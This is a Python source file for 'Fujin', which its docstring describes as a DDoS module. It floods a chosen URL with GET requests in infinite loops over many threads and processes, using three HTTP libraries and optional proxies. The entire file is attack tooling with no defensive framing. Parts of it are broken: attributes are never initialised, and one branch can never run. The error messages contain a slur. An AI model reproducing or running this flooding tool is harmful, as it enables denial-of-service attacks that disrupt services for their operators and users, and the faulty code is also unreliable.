
import requests
import socket
import aiohttp
import threading
import multiprocessing
import asyncio
import sys
import urllib3

class Fujin:

    def __init__(self, 
                 url: str | None = None, 
                 header: dict | None = None, 
                 proxies: dict | None = None, 
                 data: dict | None = None,
                 cookies: dict | None = None,
                 redirects: bool | None = None,
                 timeout: int | None = None) -> None:
        """
        A Object-Orientated DDoS Module

        Initialise your very own ddos tool with an object with only just one line of code.

        Contains multiple pooling manager modules to help initialise a DDoS

        Allows for entering your very custom own Headers, Data, and Proxies.
        """

        # Turn parameters into self. variables for easy use
        self.url = url 
        self.header = header
        self.proxies = proxies
        self.data = data
        self.redirects = redirects
        self.timeout = timeout
        self.cookies = cookies

        # Initialise the data structures/holders for our multiprocessing functions to speed up our attacks
        self.sync_threads = []
        self.async_threads = []
        self.sync_processes = []
        self.async_processes = []

        # Log
        self.connected = 0
        self.result = None
        self.status_code = None

        # Sessions and object to
        self.session = requests.session()
        self.aiohttp_session = aiohttp.ClientSession()
        self.urllib_session = urllib3.PoolManager()

        # Other
        self.cache_location = '.web_cache'
        self.cache_session = None

        # Pooling manager names
        self.aio = ['aiohttp', 'Aiohttp', 'AIOHTTP']
        self.requests = ['requests', 'Requests', 'REQUESTS']
        self.urllib = ['urllib', 'URLLIB', 'urllib3', 'URLLIB3', 'Urllib', 'Urllib3']



    #
    # Error Handling
    #
    def close_sessions(self) -> None:
        """
        Closes all Sessions and Pooling Managers
        """
        try:
            print("\n\n\n")
            # Close Requests Session
            self.session.close()
            print("\ Requests Session Closed")

            # Close AIOHTTP Session
            asyncio.run(self.aiohttp_session.close())
            print("\ AIOHTTP Session Closed")

            # URLLIB3 PoolManager
            self.urllib_session.clear()
            print("\ URLLIB Session Closed\n\n\n")

            # Dip out
            sys.exit(0)
        except Exception as e:
            print(f"\n\n{e}\n\n")
            sys.exit(0)

    async def close_sessions_a(self) -> None:
        """
        Closes all Sessions and Pooling Managers
        """
        try:
            # Close Requests Session
            self.session.close()
            print("\ Requests Session Closed")

            # Close AIOHTTP Session
            await self.aiohttp_session.close()
            print("\ AIOHTTP Session Closed")

            # URLLIB3 PoolManager
            self.urllib_session.clear()
            print("\ URLLIB Session Closed\n\n\n")

            # Dip out
            sys.exit(0)
        except Exception as e:
            print(f"\n\n{e}\n\n")
            sys.exit(0)
    


    #
    # Async and Sync GET Requests
    #
    async def async_get(self) -> None:

        """
        A Normal GET request that uses the 'requests' module

        A requests.session() object held within the self.session object inside the ddos object

        If you would like to run this function by yourself I would advise running either

        await async_get()

        or

        asyncio.run(async_get())

        Most likely the second as it is easiest and fastest to run

        You will require the asyncio module to be installed and imported though.
        """

        # Send A GET Request
        r = self.session.get(self.url, headers=self.header)

        # Assign to Object-Orientated Variable
        self.status_code = r.status_code
        self.connected += 1
        self.result = self.connected, self.status_code

        print(f"{self.result}")
    

    def sync_get(self) -> None:

        """
        A simple synchronous function that allows you to run a GET request
        """
        
        # Send A GET Request
        r = self.session.get(self.url, 
                             headers=self.header, 
                             proxies=self.proxies, 
                             data=self.data,
                             allow_redirects=self.redirects)

        # Assign to Object-Orientated Variable
        self.status_code = r.status_code
        self.connected += 1
        self.result = self.connected, self.status_code

        print(f"{self.result}")

    
    async def aio_async_get(self) -> None:
        """
        Aynschronous Version

        Sends a GET Request with the AIOHTTP ClientSession Class
        """

        r = self.aiohttp_session.get(url=self.url, allow_redirects=self.redirects, ssl=False)

        # Log
        self.sent += 1
        self.status_code = r.cr_code

        print(r)

    def aio_sync_get(self) -> None:
        """
        Synchronous Version

        Sends a GET Request with the AIOHTTP ClientSession Class
        """

        with self.aiohttp_session.get(url=self.url, allow_redirects=self.redirects, ssl=False) as r:
            print(r)
        self.sent+=1
        self.status_code=r.cr_code

    async def urllib_async_get(self) -> None:

        r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
        self.connected += 1
        self.status_code = r.status
        self.result = self.status_code, self.connected
        print(f"{self.result}")

    async def urllib_sync_get(self) -> None:

        r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
        self.connected += 1
        self.status_code = r.status
        self.result = self.status_code, self.connected
        print(f"{self.result}")
    



    #
    # Infinite loops for Async and Sync functions
    #
    def begin_async_get_attack(self) -> None:   

        """
        while 1:
            asyncio.run(self.async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """

        while 1:
            asyncio.run(self.async_get())

    def begin_sync_get_attack(self) -> None:
        """
        while 1:
            self.sync_get()

        An infinite loop running the synchronous get function with python requests session
        """
        while 1:
            self.sync_get()

    def begin_aio_async_attack(self) -> None:
        """
        while 1:
            asyncio.run(self.aio_async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """
        while 1:
            asyncio.run(self.aio_async_get())

    def begin_aio_sync_attack(self) -> None:
        """
        while 1:
            self.sync_get()

        An infinite loop running the synchronous get function with python requests session
        """

        while 1:
            self.aio_sync_get()

    def begin_urllib_async_attack(self) -> None:
        """
        while 1:
            asyncio.run(self.urllib_async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """

        while 1:
            asyncio.run(self.urllib_async_get())

    def begin_urllib_sync_attack(self) -> None:
        """
        while 1:
            self.urllib_sync_get()

        An infinite loop running the synchronous get function with the urllib pooling manager
        """

        while 1:
            self.urllib_sync_get()


    


    #
    # Threading Attacks
    #
    def thread_async_attack(self, 
                            threads: int | None=None, 
                            daemon: bool | None=None,
                            pooling_manager: str | None = None) -> None:
        """
        Uses the threading module to speed up the attack, with as many threads as you like

        Pooling Manager Options:

        1. Requests
        2. Aiohttp
        3. Urllib3
        """

        if daemon == None: daemon = True

        if pooling_manager in self.requests:
            for x in range(threads):
                t = threading.Thread(target=self.begin_async_get_attack, daemon=daemon)
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].start()
            for x in range(threads):
                self.async_threads[x].join()

        elif pooling_manager in self.aio:
            for x in range(threads):
                t = threading.Thread(target=self.begin_aio_async_attack, daemon=daemon)
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].start()
            for x in range(threads):
                self.async_threads[x].join()

        elif pooling_manager in self.urllib:
            for x in range(threads):
                t = threading.Thread(target=self.begin_urllib_async_attack, daemon=daemon)
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].start()
            for x in range(threads):
                self.async_threads[x].join()

        else:
            print("Choose a window manager ya retard")
            self.close_sessions()


    def thread_sync_attack(self, 
                           threads: int | None = None, 
                           daemon: bool | None = None,
                           pooling_manager: str | None = None) -> None:
        """
        Uses the threading module to speed up the attack, with as many threads as you like

        Pooling Manager Options (write as a string):

        1. Requests
        2. Aiohttp
        3. Pooling Manager
        """

        if daemon == None: daemon = True

        if pooling_manager in self.requests:
            for x in range(threads):
                t = threading.Thread(target=self.begin_sync_get_attack, daemon=daemon)
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].start()
            for x in range(threads):
                self.async_threads[x].join()

        elif pooling_manager in self.aio:
            for x in range(threads):
                t = threading.Thread(target=self.begin_aio_sync_attack, daemon=daemon)
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].start()
            for x in range(threads):
                self.async_threads[x].join()

        elif pooling_manager in self.urllib:
            for x in range(threads):
                t = threading.Thread(target=self.begin_aio_sync_attack, daemon=daemon)
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].start()
            for x in range(threads):
                self.async_threads[x].join()

        else:
            print("Choose a window manager ya retard")
            self.close_sessions()




    #
    # Multiprocessing Attacks
    #
    def multiproc_sync_attack(self, 
                              number_of_processes: int | None = None, 
                              daemon: bool | None = None,
                              pooling_manager: str | None = None) -> None:
        """
        Uses the multiprocessing function to speed up the attack.

        Pooling Manager Options (write as a string):

        1. Requests
        2. Aiohttp
        3. Pooling Manager
        """

        # Rename the variable so I can easily write :)))
        numproc = number_of_processes

        if daemon == None: daemon = True

        if pooling_manager in self.requests:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_sync_get_attack, daemon=daemon)
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].start()
            for x in range(numproc):
                self.async_processes[x].join()

        elif pooling_manager in self.aio:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_aio_sync_attack, daemon=daemon)
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].start()
            for x in range(numproc):
                self.async_processes[x].join()
            
        elif pooling_manager in self.aio:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_urllib_sync_attack, daemon=daemon)
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].start()
            for x in range(numproc):
                self.async_processes[x].join()

        else:
            print("Choose a pooling manager ya sausage !!!")
            self.close_sessions()


    def multiproc_async_attack(self, 
                               number_of_processes: int | None = None, 
                               daemon: bool | None = None,
                               pooling_manager: str | None = None) -> None:

        """
        Uses the multiprocessing function to speed up the attack.

        It pools a synchronous function that contains an infinite loop that runs the asynchronous function

        Pooling Manager Options (write as a string):

        1. Requests
        2. Aiohttp
        3. Pooling Manager
        """
        
        # Rewrite the var so i can easy write :)))
        numproc = number_of_processes

        if daemon == None: daemon = True

        if pooling_manager in self.requests:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_async_get_attack, daemon=daemon)
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].start()
            for x in range(numproc):
                self.async_processes[x].join()

        elif pooling_manager in self.aio:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_aio_async_attack, daemon=daemon)
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].start()
            for x in range(numproc):
                self.async_processes[x].join()

        elif pooling_manager in self.aio:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_urllib_async_attack, daemon=daemon)
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].start()
            for x in range(numproc):
                self.async_processes[x].join()

        else:
            print("Choose a pooling manager ya sausage !!!")
            self.close_sessions()
